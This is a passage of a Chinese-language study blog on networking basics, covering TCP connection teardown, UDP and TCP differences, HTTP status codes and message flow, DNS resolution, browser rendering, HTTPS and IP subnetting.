/>*第一种回答：*这是因为服务端的listen状态下的socket当收到SYN报文的连接请求时后，它可以把ACK和SYN（ACK起到应答作用，而SYN起同步作用）放在一个报文里来发送。但关闭连接时，当收到对方的FIN报文通知时，它仅仅表示对方没有数据发送给你了，但未必你所有的数据都全部发送给对方了，所以你可以未必会关闭socket连接，也即你可能还需要发送一些数据给对方之后，在发送FIN报文给对方来表示你同意现在可以关闭连接了，所以它这里的ACK报文和FIN报文多数情况下都是分开发送的。</p><p>*第二种回答：*因为当Server端收到Client端的SYN连接请求后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭Socket，所以只能先回复一个ACK报文，告诉client端，“你发送的FIN报文我收到了”。只有等到Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送，故需要四次挥手。</p><p><strong>为什么TIME_WAIT状态还需要等待2MSL后才能返回到CLOSED状态？</strong><br />答：因为虽然双方都同意关闭连接了，而且握手的4个报文也都发送完毕，按理可以直接回到CLOSED状态（就好比从SYN_SENT状态到ESTABLISH状态那样），但是我们必须假想网络是不可靠的，有可能最后一个ACK丢失。所以TIME_WAIT状态就是用来重发可能丢失的ACK报文。</p><h2 id="udp报头格式"><a class="markdownIt-Anchor" href="#udp报头格式"></a> UDP报头格式</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20150819162030063.png" alt="" /></p><p>源端口号：在需要对方回信时选用。不需要是可全为0<br />目的端口号：这在终点交付报文时必须要使用到<br />UDP长度：UDP报文的字节长度（包括首部和数据）<br />UDP校验和：检验UDP首部和数据部分的正确性</p><h2 id="tcpudp区别"><a class="markdownIt-Anchor" href="#tcpudp区别"></a> TCP/UDP区别</h2><p><em>课本：</em><br />UDP在传输数据之前<strong>不需要先建立连接</strong>。远程主机的运输层在收到UDP报文后，不需要给出任何确认。虽然UDP不提供可靠交付，但在某些情况下UDP却是一种最有效的工作方式。</p><p>TCP则<strong>提供面向连接的服务</strong>。在传送数据之前必须先建立连接，数据传送结束后要释放连接。TCP不提供广播或多播服务。由于TCP要提供可靠地、面向连接的运输服务，因此不可避免地增加了许多的开销，如确认、流量控制、计时器以及连接管理等。这不仅使协议数据单元的首部增大很大，还要占用许多的处理机资源。</p><p><em>博客答案：</em></p><table><thead><tr><th></th><th>TCP</th><th>UDP</th></tr></thead><tbody><tr><td>是否连接</td><td>面向连接</td><td>面向非连接</td></tr><tr><td>传输可靠性</td><td>可靠的</td><td>不可靠的</td></tr><tr><td>应用场合</td><td>传输大量的数据</td><td>少量数据</td></tr><tr><td>速度</td><td>慢</td><td>块</td></tr></tbody></table><p>OSI和TCP/IP模型在传输层定义两种传输协议：TCP（传输控制协议）和UDP（用户数据报协议）。</p><p><strong>UDP</strong><br />UDP和TCP的主要区别在于UDP不一定提供可靠的数据传输。事实上，该协议不能保证数据准确无误地到达目的地。UDP在很多方面非常有效。当某个程序的目标是尽快地传输尽可能多的信息时（其中任意给定的重要性相对较低），可使用UDP。许多程序将使用单独的TCP连接和单独的UDP连接。重要的状态信息随可靠的TCP连接发送，而主数据留通过UDP发送。</p><p><strong>TCP</strong><br />TCP的目的是提供可靠的数据传输，并在相互进行通信的设备或服务之间保持一个虚拟连接。TCP在数据包接收无序、丢失或在交付期间被破坏时，负责数据恢复。它通过为其发送的每个数据包提供一个序号来完成此恢复。较低的网络层会将每个数据包视为一个独立的单元，因此，数据包可以沿完全不同的路径发送，即使它们都是同一消息的组成部分。这种路由与网络层处理分段和重新组装数据包的方式非常相似，只是级别更高而已。<br />为确保正确地接收数据，TCP要求在目标计算机成功收到数据时发回一个确认（即ACK）。如果在某个时限内未收到相应的ACK，将重新传送数据包。如果网络阻塞，这种重新传送将导致发送的数据包重复。但是，接收计算机可使用数据包的序号来确认它是否为重复数据包，并在必要时丢弃它。</p><p><strong>TCP与UDP的选择：</strong><br />如果比较UDP包和TCP包的结构，很明显UDP包不具备TCP包复杂的可靠性和控制机制。与TCP协议相同，UDP的源端口数和目的端口数也都支持一台主机上的多个应用。一个16位的UDP包包含了一个字节长的头部和数据的长度，校验码域使其可以进行整体校验。（许多应用只支持UDP，如：多媒体数据流，不产生任何额外的数据，即使知道有破坏的包也不进行重发。）很明显，当数据传输的性能必须让位于数据传输的完整性、可控制性和可靠性时，TCP协议是首选。当强调性能而不是传输的完整性时，如：音频和多媒体应用，UDP是最好的选择。在数据传输时间很短，以至于此前的连接过程成为整个流量主体的情况下，UDP较低的开销使其有更好的机会去传送管理数据。TCP丰富的功能有时会导致不可预料的性能低下，但是我们相信在不远的将来，TCP可靠的点对点将会用于绝大多数的网络应用。</p><p><strong>TCP协议和UDP协议特性区别总结：</strong></p><ul><li>TCP协议在传送数据段的时候要给段标号；UDP不需要</li><li>TCP协议可靠；UDP协议不可靠</li><li>TCP协议是面向连接的；UDP协议采用无连接</li><li>TCP协议负载较高，采用虚电路；UDP采用无连接</li><li>TCP协议的发送方要确认接收方是否收到数据段（3次握手协议）</li><li>TCP协议采用窗口技术和流控制</li></ul><h2 id="http状态码"><a class="markdownIt-Anchor" href="#http状态码"></a> HTTP状态码</h2><p>当浏览器访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含HTTP状态码的信息头（server header）用以响应浏览器的请求。</p><p>HTTP状态码的英文为HTTP Status Code。下面是常见的HTTP状态码：</p><ul><li>200 请求成功</li><li>301 资源（网页等）被永久转移到其他URL</li><li>404 请求的资源（网页等）不存在</li><li>500 内部服务器错误</li></ul><p><strong>状态码分类</strong></p><table><thead><tr><th>分类</th><th>分类描述</th></tr></thead><tbody><tr><td>1**</td><td>信息，服务器收到请求，需要请求者进行执行操作</td></tr><tr><td>2**</td><td>成功，操作被成功接收并处理</td></tr><tr><td>3**</td><td>重定向，需要进一步的操作以完成请求</td></tr><tr><td>4**</td><td>客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td>5**</td><td>服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><p><strong>状态码列表</strong></p><table><thead><tr><th>状态码</th><th>状态码英文名称</th><th>中文描述</th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>继续，客户端应继续其请求</td></tr><tr><td>101</td><td>Switching Protocols</td><td>切换协议。服务器根据客户端的请求切换协议。只能切换到HTTP的新版本协议</td></tr><tr><td></td><td></td><td></td></tr><tr><td>200</td><td>OK</td><td>请求成功。一般用于GET和POST请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>非授权信息。请求成功，但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清楚浏览器的表单域</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分GET请求</td></tr><tr><td></td><td></td><td></td></tr><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包含多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久的移动到新URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td>302</td><td>Found</td><td>临时移动。与301类似，但资源只是临时被移动，客户端应继续使用原有URI</td></tr><tr><td>303</td><td>See Other</td><td>查看其它地址，与301、302类似，如果最初的请求是POST，那么新文档要用GET找到</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>使用代理，所请求的资源必须通过代理访问</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的HTTP状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与302类似，使用GET请求重定向</td></tr><tr><td></td><td></td><td></td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求的语法错误，服务器无法理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求要求用户的身份认证</td></tr><tr><td>402</td><td>Payment Required</td><td>保留</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td>404</td><td>Not Found</td><td>服务器无法根据客户端的请求找到资源（网页），通过此代码，网站设计人员可设置“您所请求的资源无法找到”的个性页面</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>客户端请求中的方法被禁止</td></tr><tr><td>406</td><td>Not Acceptable</td><td>服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td>407</td><td>Proxy Authentication Required</td><td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td>408</td><td>Request Time-out</td><td>服务器等待客户端发送的请求时间太长，超时</td></tr><tr><td>409</td><td>Conflict</td><td>服务器完成客户端的PUT请求是可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td>410</td><td>Gone</td><td>客户端请求的资源已经不存在，410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td>411</td><td>Length Required</td><td>服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td>412</td><td>Precondition Failed</td><td>客户端请求信息的先决条件错误</td></tr><tr><td>413</td><td>Request Entity Too Large</td><td>由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连接请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td>414</td><td>Request-URI Too Large</td><td>请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td>415</td><td>Unsupported Media Type</td><td>服务器无法处理请求附带的媒体格式</td></tr><tr><td>416</td><td>Requested range not satisfiable</td><td>客户端请求的范围无效</td></tr><tr><td>417</td><td>Expectation Failed</td><td>服务器无法满足Expect的请求头信息</td></tr><tr><td></td><td></td><td></td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>充当网关或代理的服务器，从远端服务器接收到了一个无效的请求</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td>504</td><td>Gateway Time-out</td><td>充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version not supported</td><td>服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table><h2 id="http协议"><a class="markdownIt-Anchor" href="#http协议"></a> HTTP协议</h2><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写，是用于从万维网（WWW：World Wide Web）服务器传输超文本到本地浏览器的传送协议。</p><p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML文件、图片文件、查询结果等）。</p><p><strong>主要特点</strong></p><ul><li>简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、POST。</li><li>灵活：HTTP允许传输任意类型的数据对象，正在传输的类型由Content-Type加以标记</li><li>无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</li><li>无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传输的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</li><li>支持B/S及C/S</li></ul><h3 id="http之url"><a class="markdownIt-Anchor" href="#http之url"></a> HTTP之URL</h3><p>HTTP使用统一资源标识符（Uniform Resource Identifiers，URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息。<br />URL，全称是Uniform Resource Locator，中文叫统一资源定位符，是互联网上用来标识某一处资源的地址。</p><ol><li><p>URI，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。<br />Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的URI一般有三个部分组成：</p><ul><li>访问资源的命名机制</li><li>存放资源的主机名</li><li>资源自身的名称，有路径标识，着重强调于资源</li></ul></li><li><p>URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。<br />URL是Internet上用来描述资源信息的字符串，主要用在各种WWW客户程序客户程序和服务器程序上。</p><p>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部分组成：</p><ul><li>协议（或称为服务方式）</li><li>存有该资源的主机IP地址（有时也包括端口号）</li><li>主机资源的具体地址。如目录和文件名等</li></ul></li><li><p>URN，uniform resource name，统一资源命名，是通过名字来标识资源</p></li></ol><p>URI是一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个URL都是URI，但不一定每个URI都是URL。这是因为URI还包括一个子类，即统一资源名称（URN），它命名资源但不指定如何定位资源。</p><p>在Java的URI中，一个URI实例可以代表绝对的，也可以相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包括了定位该资源的信息，因此它不能是相对的。</p><p>在Java类库中，URI类不包括任何访问资源的方法，它唯一的作用就是解析。相反的是，URL类可以打开一个到达资源的流。</p><h3 id="http之请求信息request"><a class="markdownIt-Anchor" href="#http之请求信息request"></a> HTTP之请求信息Request</h3><p>客户端发送一个HTTP请求到服务器的请求信息包括以下格式：<strong>请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。</strong></p><h3 id="http之响应消息response"><a class="markdownIt-Anchor" href="#http之响应消息response"></a> HTTP之响应消息Response</h3><p>一般情况下，服务器接收并处理客户端发过来的请求后返回一个HTTP的响应消息。<strong>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">200 OK                        &#x2F;&#x2F;客户端请求成功</span><br><span class="line">400 Bad Request               &#x2F;&#x2F;客户端请求有语法错误，不能被服务器所理解</span><br><span class="line">401 Unauthorized              &#x2F;&#x2F;请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 </span><br><span class="line">403 Forbidden                 &#x2F;&#x2F;服务器收到请求，但是拒绝提供服务</span><br><span class="line">404 Not Found                 &#x2F;&#x2F;请求资源不存在，eg：输入了错误的URL</span><br><span class="line">500 Internal Server Error     &#x2F;&#x2F;服务器发生不可预期的错误</span><br><span class="line">503 Server Unavailable        &#x2F;&#x2F;服务器当前不能处理客户端的请求，一段时间后可能恢复正常</span><br></pre></td></tr></table></figure><h3 id="http工作原理"><a class="markdownIt-Anchor" href="#http工作原理"></a> HTTP工作原理</h3><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p><p>以下是HTTP请求/响应的步骤：</p><ol><li>客户端连接到Web服务器<br />一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认是80）建立一个TCP套接字连接。</li><li>发送HTTP请求<br />通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4个部分组成。</li><li>服务器接受请求并返回HTTP响应<br />Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4个部分组成。</li><li>释放连接TCP连接<br />若connection模型为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接；若connection模型为keep alive，则该连接会保持一段时间，则该时间内可以继续接受请求。</li><li>客户端浏览器解析HTML内容<br />客户端浏览器首先解析状态行，查看表明请求是否成功的状态码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。<br />例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程：<br />① 浏览器向DNS服务器请求解析该URL中的域名所对应的IP地址；<br />② 解析出IP地址后，根据该IP地址和默认端口80，和服务器建立TCP连接；<br />③ 浏览器发出读取文件（URL中域名后面部分对应的文件）的HTTP请求，该请求报文作为TCP三次握手的第三个报文的数据发送给服务器；<br />④ 服务器对浏览器请求作出响应，并将对应的HTML文本发送给浏览器；<br />⑤ 释放TCP连接<br />⑥ 浏览器将该HTML文本显示</li></ol><p><strong>GET和POST请求的区别</strong></p><ul><li>GET提交的数据会放在URL之后，以？分割URL和传输数据，参数之间以&amp;相连；POST方法是把提交的数据放在HTTP包的body里面；</li><li>GET提交的数据大小有限制（HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制，只是由于浏览器对URL的长度有限制），而POST方法提交的数据没有限制；</li><li>GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值；</li><li>GET方式提交数据，会带来安全问题</li><li>GET方式通过一次HTTP请求即可获得数据；POST方式通过两次HTTP请求获得数据，第一次返回状态码100表示浏览器继续请求。</li></ul><h2 id="osi协议-tcpip协议以及每层对应的协议"><a class="markdownIt-Anchor" href="#osi协议-tcpip协议以及每层对应的协议"></a> OSI协议、TCP/IP协议以及每层对应的协议</h2><p>OSI分层 （7层）：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层；<br />TCP/IP分层（4层）：网络接口层、 网际层、运输层、 应用层；<br />5层协议 （5层）：物理层、数据链路层、网络层、运输层、 应用层；</p><h2 id="session机制-cookie机制"><a class="markdownIt-Anchor" href="#session机制-cookie机制"></a> session机制、cookie机制</h2><p>由于http协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是session。这个session是保存在服务端的，有一个唯一标识。在服务端保存session的方法有很多，内存、数据库、文件都可以。</p><p>每次http请求的时候，客户端都会发送相应的cookie信息到服务端，实际上大多数的应用都是用cookie来实现session跟踪的，第一次创建session的时候，服务端会在http协议中告诉客户端，需要在cookie里面记录一个session id，以后每次请求把这个会话id发送到服务器。</p><p>如果客户端浏览器禁用了cookie，在这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪，即每次http请求，URL后面都会附上一个诸如sid=xxx这样的参数，服务端据此来标识用户。</p><p><em>总结：Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。</em></p><h2 id="打开网页到页面显示之间的过程"><a class="markdownIt-Anchor" href="#打开网页到页面显示之间的过程"></a> 打开网页到页面显示之间的过程</h2><h3 id="dns解析"><a class="markdownIt-Anchor" href="#dns解析"></a> DNS解析</h3><h4 id="解析过程"><a class="markdownIt-Anchor" href="#解析过程"></a> 解析过程</h4><p>DNS解析是一个递归查询的过程<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20180909164251348.png" alt="" /></p><p>上图是查找www.google.com的IP地址流程。首先在本地域名服务器中查询IP地址，如果没有找到的情况下，本地域名服务器会向根域名服务器发送一个请求，如果根域名服务器也不存在该域名时，本地域名会向com顶级域名服务器发送一个请求，依次类推下去。直到最后本地域名服务器得到google的IP地址并把它缓存到本地，供下次查询使用。从上述过程中，可以看出网址的解析是一个从左向右的过程：com-&gt;google.com-&gt;<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a>。事实上，<a href="http://xn--www-cs6et69dkeh2jun9at96b.google.com" target="_blank" rel="noopener">真正的网址是www.google.com</a>.，最后一个.对应的就是根域名服务器，默认情况下，通常会省略，浏览器在请求DNS的时候都会自动加上，所有网址真正的解析过程是：<code>.-&gt;.com-&gt;google.com.-&gt;www.google.com.</code>。</p><h4 id="dns优化"><a class="markdownIt-Anchor" href="#dns优化"></a> DNS优化</h4><p><strong>DNS缓存</strong><br />DNS存在着多级缓存，从离浏览器的距离排序的话，有以下几种：浏览器缓存、系统缓存、根域名服务器缓存、顶级域名服务器缓存、主域名服务器缓存</p><p><strong>DNS负载均衡</strong><br />DNS可以返回一个合适的机器的IP给用户，例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等，这种过程就是DNS负载均衡，又叫做DNS重定向。CDN（Content Delivery Network）就是利用DNS的重定向技术，DNS服务器会返回一个跟用户最接近的点的IP返回给用户，CDN节点的服务器负责响应用户的请求，提供所需的内容。</p><h3 id="tcp连接"><a class="markdownIt-Anchor" href="#tcp连接"></a> TCP连接</h3><p>HTTP协议是使用TCP作为其传输层协议的，当TCP出现瓶颈时，HTTP也会受到影响。</p><h4 id="https协议"><a class="markdownIt-Anchor" href="#https协议"></a> HTTPS协议</h4><p>HTTP报文是包裹在TCP报文中发送的，服务器端收到TCP报文时会解包提取出HTTP报文。但是这个过程中存在一定的风险，HTTP报文是明文，如果中间被截取的话会存在一定信息泄露的风险。HTTPS协议的本质就是HTTP+SSL(or TLS)。在HTTP报文进入TCP报文之前，先使用SSL对HTTP报文进行加密。从网络的层次结构中看它位于HTTP协议与TCP协议之间。</p><p>https在传输数据之前需要客户端与服务端进行一个握手（TCL/SSL握手），在握手过程中将确立双方加密传输数据的密码信息。TCL/SSL使用了非对称加密，对称加密和hash等。具体过程见的阮一峰先生的博客<a href="http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html" target="_blank" rel="noopener">图解SSL/TLS协议</a></p><h4 id="http请求"><a class="markdownIt-Anchor" href="#http请求"></a> HTTP请求</h4><p>发送HTTP请求的过程就是构建HTTP请求报文并通过TCP协议发送到服务器指定端口（80和443）。HTTP请求报文是由三部分组成：请求行、请求报头和请求正文。</p><h4 id="服务器处理请求并返回http报文"><a class="markdownIt-Anchor" href="#服务器处理请求并返回http报文"></a> 服务器处理请求并返回HTTP报文</h4><p>后端从在固定的端口接收到TCP报文开始，这一部分对应于编程语言中的socket。它会对TCP连接进行处理，对HTTP协议进行解析，并按照报文格式进一步封装成HTTP Request对象，供上层使用。这一部分工作一般由Web服务器去进行处理，有Tomcat、Jetty和Netty等。</p><p>HTTP响应报文也是由三部分组成：状态码、响应报头和响应报文。</p><h3 id="浏览器解析渲染页面"><a class="markdownIt-Anchor" href="#浏览器解析渲染页面"></a> 浏览器解析渲染页面</h3><p>浏览器是一个边解析边渲染的过程。首先浏览器解析HTML文件构建DOM树，然后解析CSS文件构建渲染树，等到渲染树构建完成后，浏览器开始布局渲染树并将其绘制到屏幕上。这个过程比较复杂，涉及到两个概念: reflow(回流)和repain(重绘)。DOM节点中的各个元素都是以盒模型的形式存在，这些都需要浏览器去计算其位置和大小等，这个过程称为relow；当盒模型的位置,大小以及其他属性，如颜色，字体，等确定下来之后，浏览器便开始绘制内容，这个过程称为repain。页面在首次加载时必然会经历reflow和repain。</p><p>JS的解析是由浏览器中的JS解析引擎完成的。JS是单线程运行，也就是说，在同一个时间内只能做一件事，所有的任务都需要排队，前一个任务结束，后一个任务才能开始。但是又存在某些任务比较耗时，如IO读写等，所以需要一种机制可以先执行排在后面的任务，这就是：同步任务(synchronous)和异步任务(asynchronous)。JS的执行机制就可以看做是一个主线程加上一个任务队列(task queue)。同步任务就是放在主线程上执行的任务，异步任务是放在任务队列中的任务。所有的同步任务在主线程上执行，形成一个执行栈;异步任务有了运行结果就会在任务队列中放置一个事件；脚本运行时先依次运行执行栈，然后会从任务队列里提取事件，运行任务队列中的任务，这个过程是不断重复的，所以又叫做事件循环(Event loop)。</p><p>浏览器在解析过程中，如果遇到请求外部资源时，如图像,iconfont,JS等。浏览器将重复1-6过程下载该资源。请求过程是异步的，并不会影响HTML文档进行加载，但是当文档加载过程中遇到JS文件，HTML文档会挂起渲染过程，不仅要等到文档中JS文件加载完毕还要等待解析执行完毕，才会继续HTML的渲染过程。原因是因为JS有可能修改DOM结构，这就意味着JS执行完成前，后续所有资源的下载是没有必要的，这就是JS阻塞后续资源下载的根本原因。CSS文件的加载不影响JS文件的加载，但是却影响JS文件的执行。JS代码执行前浏览器必须保证CSS文件已经下载并加载完毕。</p><h3 id="web优化"><a class="markdownIt-Anchor" href="#web优化"></a> Web优化</h3><p>如何尽快的加载资源？答案就是能不从网络中加载的资源就不从网络中加载，当我们合理使用缓存，将资源放在浏览器端，这是最快的方式。如果资源必须从网络中加载，则要考虑缩短连接时间，即DNS优化部分;减少响应内容大小，即对内容进行压缩。另一方面，如果加载的资源数比较少的话，也可以快速的响应用户。当资源到达浏览器之后，浏览器开始进行解析渲染，浏览器中最耗时的部分就是reflow，所以围绕这一部分就是考虑如何减少reflow的次数。</p><p><strong>补充：</strong></p><ol><li><p>一个完整的HTTP请求，通常有以下7个步骤</p><ul><li>建立TCP连接</li><li>web浏览器向web服务器发送请求命令</li><li>浏览器发送请求头信息</li><li>服务器应答</li><li>服务器发送应答头信息</li><li>服务器向浏览器发送数据</li><li>服务器关闭TCP连接</li></ul></li><li><p>一个HTTP请求由四部分组成</p><ul><li>HTTP请求方法或动作，如：GET与POST</li><li>正在请求的URL</li><li>请求头，包含一些客户端环境信息、身份验证信息</li><li>请求体，即请求正文，可包含提交的查询字符串信息、表单信息等。</li></ul></li><li><p>一个HTTP响应一般由三个部分组成</p><ul><li>一个数字和文字组成的状态码，用来显示请求成功还是失败</li><li>响应头，包含许多有用的信息，如：服务器类型、日期时间、内容类型和长度</li><li>响应体，即响应正文。</li></ul></li><li><p>readyState属性（返回请求的当前状态）</p><ul><li>0，请求未初始换，open还没有调用</li><li>1，服务器连接已建立，open已经调用</li><li>2，请求已接收，即接收到头部信息</li><li>3，请求处理中，即接收到响应体了</li><li>4，请求已完成，且响应已就绪，即响应完成了。</li></ul></li></ol><h2 id="http和https区别https在请求时额外的过程https是如何保证数据安全的"><a class="markdownIt-Anchor" href="#http和https区别https在请求时额外的过程https是如何保证数据安全的"></a> http和https区别，https在请求时额外的过程，https是如何保证数据安全的</h2><p><strong>区别：</strong><br />HTTP协议传输的数据都是未加密的，即明文，为了保证隐私数据能加密传输，使用SSL协议用于对HTTP协议传输的数据进行加密，这就是HTTPS。简单的说，HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。</p><ul><li>https协议协议到CA申请证书，需要一定的费用</li><li>http是超文本传输协议，信息是明文传输，https则是具有安全性的SSL加密传输协议</li><li>http和https使用的是完全不用的连接方式，用到的端口不同，前者是80，后者是443</li><li>http的连接简单，是无状态的；https协议是ssl+http协议构成的可进行加密传输、身份认证的网络协议，比http协议安全</li></ul><p><strong>额外的过程：</strong><br />https在传输数据之前需要客户端与服务端进行一个握手（TCL/SSL握手），在握手过程中将确立双方加密传输数据的密码信息。TCL/SSL使用了非对称加密，对称加密和hash等。具体过程见的阮一峰先生的博客<a href="http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html" target="_blank" rel="noopener">图解SSL/TLS协议</a></p><h2 id="ip地址子网划分"><a class="markdownIt-Anchor" href="#ip地址子网划分"></a> IP地址子网划分</h2><p><strong>IP地址的划分：</strong></p><ul><li>A类地址：以0开头，网络号是前一个字节</li><li>B类地址：以10开头，网络号是前两个字节</li><li>C类地址：以110开头，网络号是前三个字节</li></ul><p><strong>IP地址由网络号和主机号组成，ip与子网掩码相与得到网络号</strong></p><p><strong>子网划分</strong><br />传统的两级ip地址空间利用率很低，1个A类网络可连接的主机数可超过1000万台，但实际连接数并不多，所以需要对网络进行子网划分，通过子网掩码来区分网络。</p><p><strong>三级ip地址：&lt;网络号&gt;&lt;子网号&gt;&lt;主机号&gt;</strong></p><h2 id="tcp如何保证数据的可靠传输的这个问题可以引申出很多子问题拥塞控制慢开始-拥塞避免-快重传-滑动窗口协议-停止等待协议-超时重传机制"><a class="markdownIt-Anchor" href="#tcp如何保证数据的可靠传输的这个问题可以引申出很多子问题拥塞控制慢开始-拥塞避免-快重传-滑动窗口协议-停止等待协议-超时重传机制"></a> TCP如何保证数据的可靠传输的（这个问题可以引申出很多子问题，拥塞控制慢开始、拥塞避免、快重传、滑动窗口协议、停止等待协议、超时重传机制）</h2><p><em>总结一：</em></p><ol><li>确认和重传：接收方收到报文就会确认，发送方发送一段时间后没有收到确认就会重传</li><li>数据校验：TCP报文头有校验和，用于校验报文是否损坏</li><li>数据合理分片和排序：<br />TCP会按最大传输单元（MTU）合理分片，接收方会缓存为按排序到达的数据，重新排序后交给应用层<br 